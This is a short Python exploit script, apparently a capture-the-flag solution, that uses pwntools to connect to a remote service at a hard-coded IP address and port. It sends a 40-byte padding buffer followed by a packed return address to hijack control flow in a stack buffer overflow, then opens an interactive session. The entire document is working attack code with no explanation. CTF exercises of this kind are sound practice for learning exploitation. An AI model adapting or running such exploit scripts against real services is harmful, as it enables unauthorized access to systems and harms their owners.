from pwn import *
r = remote('120.114.62.211',6126)

payload = b'A'*40

r.sendline(payload+p64(0x004006c6))

r.interactive()
